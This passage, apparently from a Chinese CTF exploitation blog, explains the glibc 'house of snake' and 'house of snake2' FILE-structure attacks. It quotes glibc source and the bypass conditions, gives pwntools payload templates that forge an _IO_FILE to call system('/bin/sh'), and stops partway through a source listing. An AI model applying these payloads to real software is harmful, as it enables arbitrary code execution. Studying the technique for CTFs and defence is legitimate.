class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow), <span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>。</p><p>接下来我们对<code>_IO_obstack_xsputn</code>这个函数进行分析(glibc/libcio/obprintf.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察该函数，首先获得<code>_IO_obstack_file</code>结构体中的<code>obstack</code>结构体指针作为后面函数运行的参数。然后<strong>要绕过fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</strong>，执行<code>obstack_blank_fast(obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</code>，</p><p>而<code>obstack_blank_fast</code>是个宏定义源码如下：</p><p><code>#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</code></p><p>对此<strong>不过多关注</strong>。然后执行<code>obstack_grow</code>，<code>obstack_grow</code>也是一个宏源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       int __len = (length);      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, __len);      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到，当<strong>_o-&gt;next_free + <strong>len &gt; </strong>o-&gt;chunk_limit</strong>时，调用<code>_obstack_newchunk</code>，<code>_obstack_newchunk</code>函数源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">    [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对此，我们关注<code>CALL_CHUNKFUN</code>这个宏定义，<code>CALL_CHUNKFUN</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>当use_extra_arg不为0,可以控制任意函数执行,并且第一个参数可控,第二个也可控不过比较麻烦也没必要</p><h3 id="绕过条件"><a href="#绕过条件" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>总结一下需要绕过的条件：</p><ul><li><code>fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</code></li><li><code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code></li><li><code>(h)-&gt;use_extra_arg</code>不为0</li></ul><h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a>函数调用链</h3><p>从调用<code>_IO_obstack_xsputn</code>开始分析，假设满足上述所有需要绕过的所有条件，得以下调用链：</p><ul><li>_IO_obstack_xsputn<ul><li>obstack_grow<ul><li>_obstack_newchunk<ul><li>CALL_CHUNKFUN(一个宏定义)<ul><li>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1"><a href="#模板方案1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p>该方案主要是利用比较少的字节完成攻击（将fp和obstack指向同个地址）</p><ul><li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li><li><code>chunk A</code>内偏移为0x18处设为1（<code>next_free</code>)</li><li><code>chunk A</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li><li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li><li><code>chunk A</code>内偏移为0x38处设为<code>system</code>函数的地址</li><li><code>chunk A</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li><li><code>chunk A</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li><li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li><li><code>chunk A</code>内偏移为0xe0处设置<code>chunk A</code>的地址作为<code>obstack</code>结构体</li></ul><p>可参考<code>payload</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x38</span>:address_for_call,</span><br><span class="line"><span class="number">0x48</span>:address_for_rdi,</span><br><span class="line"><span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>，</span><br><span class="line"><span class="number">0xe0</span>:this_mem_address,</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案2"><a href="#模板方案2" class="headerlink" title="模板方案2"></a>模板方案2</h3><p>将fp与obstack分开指向不同的地址，方便区分，而易于理解</p><ul><li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li><li>记一块可控堆内存为B</li><li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li><li><code>chunk A</code>内偏移为0xe0处设置<code>chunk B</code>的地址作为<code>obstack</code>结构体</li><li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li><li><code>chunk B</code>内偏移为0x18处设为1（<code>next_free</code>)</li><li><code>chunk B</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li><li><code>chunk B</code>内偏移为0x38处设为<code>system</code>函数的地址</li><li><code>chunk B</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li><li><code>chunk B</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li></ul><p>可参考的<code>payload</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">obstack_pd = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x18</span>:<span class="number">0x1</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x38</span>:libc_base + libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line"><span class="number">0x48</span>:binsh,</span><br><span class="line"><span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0xd8</span>:libc_base + get_IO_str_jumps() - <span class="number">0x300</span> + <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0xe0</span>:heap_base + <span class="number">0x250</span> + <span class="number">0x100</span>,</span><br><span class="line"><span class="number">0x100</span>:obstack_pd</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="house-of-snake2"><a href="#house-of-snake2" class="headerlink" title="house of snake2"></a>house of snake2</h1><h2 id="概要-20"><a href="#概要-20" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>glibc2.37</code>删除了<code>_IO_obstack_jumps</code>这个<code>vtable</code>。但是在源码里obstack结构体依然存在,在此，<code>house of snake</code>利用链与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是伪造相关结构体并且修改虚表指针为<code>_IO_printf_buffer_as_file_jumps</code>实现攻击</p><p><strong>利用条件:</strong></p><ol><li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li><li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数。</li><li>能够泄露堆地址和<code>libc</code>基址。</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-20"><a href="#原理-20" class="headerlink" title="原理"></a>原理</h2><p>house of snake2也利用了obstack这个结构体</p><p>在house of snake中obstack被包装于_IO_obstack_file中</p><p>但在2.37以后被包装于__printf_buffer_obstack结构体中(glibc/libcio/obstack.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* obstack_1grow is called for compatibility reasons.  This needs</span></span><br><span class="line"><span class="comment">     one extra character, and this is the backing store for it.  */</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base; <span class="number">0x0</span><span class="number">-0x8</span></span><br><span class="line">  <span class="type">char</span> *write_ptr;<span class="number">0x8</span><span class="number">-0x10</span></span><br><span class="line">  <span class="type">char</span> *write_end;<span class="number">0x10</span><span class="number">-0x18</span></span><br><span class="line">  <span class="type">uint64_t</span> written;<span class="number">0x18</span><span class="number">-0x20</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span> <span class="number">0x20</span><span class="number">-0x24</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>glibc2.37</code>中有一个新的<code>vtable</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>__printf_buffer_as_file_overflow</code>，<code>__printf_buffer_as_file_xsputn</code></p><p>这个vtable明显能看出是由_IO_obstack_jumps变化而来</p><p>接下来我们先对<code>__printf_buffer_as_file_overflow</code>进行分析(glibc-2.38\stdio-common\printf_buffer_as_file.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先堆传入的第一个参数强制类型转换为<code>__printf_buffer_as_file</code>并赋给变量<code>file</code>，然后调用<code>__printf_buffer_as_file_commit</code>函数</p><p><strong>__printf_buffer_as_file_commit函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出该函数通过断言对<code>file</code>结构体中的<code>stream</code>结构体与<code>next</code>结构体中的成员进行一系列判断，然后做一个赋值的操作</p><p><strong>__printf_buffer_putc函数</strong></p><p>可以看到若<code>ch != EOF</code>就调用<code>__printf_buffer_putc</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_putc (<span class="keyword">struct</span> __printf_buffer *buf, <span class="type">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知<code>__printf_buffer_putc</code>只是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p><p>然后有判断：<code>if (!__printf_buffer_has_failed (file-&gt;next) &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</code></p><p>就是判断<code>__printf_buffer_as_file</code>结构体中的mode成员是不是<code>__printf_buffer_mode_failed</code>以及<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>，我们假设满足这两个条件，会调用<code>__printf_buffer_flush (file-&gt;next)</code></p><p><strong>__printf_buffer_flush 函数</strong></p><p>该函数其实是<code>__printf_buffer_flush =&gt; Xprintf_buffer_flush =&gt; Xprintf (buffer_do_flush) (buf) =&gt; __printf_buffer_do_flush</code></p><p>我们只需要关注<code>__printf_buffer_do_flush</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((<span class="keyword">struct</span> __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      